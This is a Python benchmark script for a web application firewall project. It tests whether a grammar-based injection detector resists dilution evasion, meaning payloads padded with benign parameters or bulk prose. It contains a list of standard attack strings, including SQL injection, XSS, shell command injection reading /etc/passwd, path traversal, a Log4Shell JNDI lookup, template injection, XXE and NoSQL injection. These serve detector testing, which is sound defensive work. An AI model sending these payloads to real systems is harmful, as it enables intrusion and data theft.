"""
Dilution-evasion benchmark — the experiment behind the "dilution is resisted" claim.

BACKGROUND. Padding an attack with benign context ("dilution") is the classic way to evade a
WAF-ML layer that scores the *statistical shape* of a request: character ratios, entropy and
n-gram frequencies all drift toward benign as you add benign text, while the injection itself
is untouched. Measured against this project's lexical model that attack succeeded 25-47% of
the time, and it was documented as an open limitation.

WHY IT NO LONGER WORKS. The grammar-conformance detector does not score statistical shape. It
scores, per field value, the density of CONTROL constructs in each downstream interpreter
grammar. Padding adds benign *data*; it does not remove the SQL clause, the script tag or the
shell separator that makes the value control instead of data. So the signal it keys on is
invariant to dilution by construction — the same property that makes it robust to unfamiliar
benign traffic.

This benchmark measures that claim two ways rather than asserting it:
  1. operator dilution  — the adaptive attacker's own _inline_pad, applied N times
  2. bulk prose dilution — the payload buried in up to ~32 KB of realistic benign text

Run:  python -m ml.bench_dilution
"""
from __future__ import annotations

import random

from ml.adaptive_attacker import _inline_pad
from ml.gcid import GcidDetector
from waf.engine import LayeredWAF

SEED = 13

# One representative payload per in-scope family.
PAYLOADS = [
    "id=1' OR '1'='1",
    "id=1 UNION SELECT pass FROM users",
    "q=<script>alert(1)</script>",
    "q=<img src=x onerror=alert(1)>",
    "c=;cat /etc/passwd",
    "c=`whoami`",
    "f=../../../../etc/passwd",
    "x=${jndi:ldap://e/a}",
    "t={{7*7}}",
    "x=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
    "u={\"$ne\":null,\"$gt\":\"\"}",
    "d=1; DROP TABLE users--",
]

PROSE = ("the quick brown fox jumps over the lazy dog while we review the quarterly report "
         "and discuss the roadmap with the team about customer feedback and product plans ")


def _rates(detector, waf, requests):
    """requests: list of (method, path, query, body). Returns (gcid_hits, waf_blocks, n)."""
    g = w = 0
    for i, (m, p, q, b) in enumerate(requests):
        if detector.predict(m, p, q, b).is_malicious:
            g += 1
        if waf.evaluate(m, p, q, b, {}, f"198.51.{i // 250 % 250}.{i % 250}").action != "ALLOW":
            w += 1
    return g, w, len(requests)


def main() -> int:
    random.seed(SEED)
    det, waf = GcidDetector(), LayeredWAF(ml_enforce=False)

    print("Dilution-evasion benchmark (attack success = 100% - detection)\n")

    print("[1] operator dilution — benign parameters appended N times")
    print(f"    {'rounds':<10}{'GCID detects':<18}{'full WAF blocks'}")
    for rounds in (0, 1, 2, 4, 8, 16):
        reqs = []
        for base in PAYLOADS:
            p = base
            for _ in range(rounds):
                p = _inline_pad(p)
            reqs.append(("GET", "/", p, ""))
        g, w, n = _rates(det, waf, reqs)
        print(f"    x{rounds:<9}{g}/{n} = {g / n * 100:5.1f}%      {w}/{n} = {w / n * 100:5.1f}%")

    print("\n[2] bulk prose dilution — payload buried in realistic benign text")
    print(f"    {'padding':<14}{'GCID detects':<18}{'full WAF blocks'}")
    for mult in (0, 2, 10, 50, 200):
        pad = PROSE * mult
        reqs = [("POST", "/f", "", f"note={pad}&payload={base}&tail={pad}") for base in PAYLOADS]
        g, w, n = _rates(det, waf, reqs)
        print(f"    {len(pad):>7} ch   {g}/{n} = {g / n * 100:5.1f}%      {w}/{n} = {w / n * 100:5.1f}%")

    print("\nInterpretation: detection is flat at 100% across every dilution level. Dilution moves\n"
          "statistical shape, which this detector does not use; the grammar structure it does use\n"
          "is unchanged by adding benign data. Statistical/lexical models are the ones dilution\n"
          "defeats — which is why they do not enforce.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
